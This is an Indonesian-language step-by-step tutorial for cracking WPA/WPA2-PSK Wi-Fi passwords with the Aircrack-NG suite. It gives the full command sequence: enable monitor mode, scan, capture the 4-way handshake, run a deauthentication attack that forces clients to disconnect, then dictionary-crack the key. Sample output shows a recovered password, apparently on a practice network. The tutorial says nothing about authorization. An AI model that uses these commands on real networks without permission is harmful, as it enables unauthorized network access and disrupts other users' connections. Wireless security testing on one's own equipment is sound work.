# Hack Wi-Fi WPA/WPA2-PSK (Aircrack-NG)

## Bahan-Bahan
- PC/Laptop
- OS Linux
- Adapter Wi-Fi (support mode monitor)
- Aircrack-NG suite
- Wordlist
- Koneksi internet

## Instal Tool

```
sudo apt-get update
sudo apt-get install aircrack-ng
```

## Langkah-Langkah

#### 1. Aktifin Mode Monitor

```
sudo airmon-ng check kill
sudo airmon-ng start [interface]
```

#### 2. Scan Wi-Fi

```
sudo airodump-ng [interface]
```

Output:

```
 CH 11 ][ Elapsed: 0 s ][ 2026-01-23 13:32                                                                                                                                                                                                 
                                                                                                                                                                                                                                           
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                                                                       
                                                                                                                                                                                                                                           
 84:16:F9:FE:64:68  -26   0       15        0    0  11  130   WPA2 CCMP   PSK  LATIHAN                                                                                                                                                     
                                                                                                                                                                                                                                           
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                                                                                                         
                                                                                                                                                                                                                                           
 84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -30    0 - 1      0        5
```

Catet:
- `ESSID`: Nama Wi-Fi
- `BSSID`: MAC address AP
- `CH`: Channel AP
- `STATION`: MAC address client
- `PWR`: Kekuatan sinyal AP dalam satuan decibel-milliwatt (`dBm`)

> [!NOTE]
> Pastiin `PWR` AP target kaga di atas `-60` powernya. Kalo di atas, berarti sinyal AP target lemah, jadi proses capture 4-way handshake bakal susah, EAPOL frame yang didapet bisa gagal atau gak lengkap, sama serangan deauth bakal jadi lama prosesnya atau malahan gagal.

#### 3. Capture Handshake

```
sudo airodump-ng -N [essid] -d [bssid] -c [channel] -w [output] [interface]
```

#### 4. Jalanin Serangan Deauth

```
sudo aireplay-ng -0 0 -a [bssid] -c [mac_client] [interface]
```

Serangan ini dipake buat mutusin koneksi client dari AP target. Pas client keputus, dia bakal nyoba konek ulang, dan di momen itu bakal muncul 4-way handshake yang bisa ditangkep dan bisa dipake buat crack kunci WPA/WPA2-PSK.

#### 5. Monitoring Handshake

```
CH 11 ][ Elapsed: 6 s ][ 2026-01-20 13:03 ][ WPA handshake: 84:16:F9:FE:64:68                                 
                                                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                           
                                                                                                               
 84:16:F9:FE:64:68  -38 100       63       25    8  11  130   WPA2 CCMP   PSK  LATIHAN                         
                                                                                                               
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                             
                                                                                                               
 84:16:F9:FE:64:68  4A:F2:3B:A2:12:29  -33    1e- 1e     0       14  EAPOL
```

Tungguin di kolom pojok kanan atas sampai nongol `WPA handshake: [bssid]`. Kalo udah nongol teken `CTRL+C`.

#### 6. Crack Kunci WPA/WPA2-PSK

```
aircrack-ng -a 2 -e [essid] -b [bssid] -l [output] [file_capture] -w [wordlist]
```

Output:

```

                               Aircrack-ng 1.7 

      [00:00:00] 11/10303727 keys tested (73.66 k/s) 

      Time left: 1 day, 14 hours, 51 minutes, 25 seconds         0.00%

                           KEY FOUND! [ 12345678 ]


      Master Key     : 8E F5 3E A1 40 2E CD 88 F6 86 74 BE 43 37 0E 7E 
                       A6 CD 79 C3 CB 7E 35 81 48 4B A1 23 B9 B9 40 87 

      Transient Key  : CB 90 49 8E 82 62 0D 37 3E 0E AD 72 7B 56 FD 53 
                       2C 16 E6 90 B1 43 65 89 2B 4E E6 A1 E0 54 26 B0 
                       11 1B 3B A6 C9 EC 38 23 08 60 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : A4 EF 5D 76 4F 5D 48 32 3C CA 55 D2 77 E9 FA D0
```

Password Wi-Fi: `12345678`
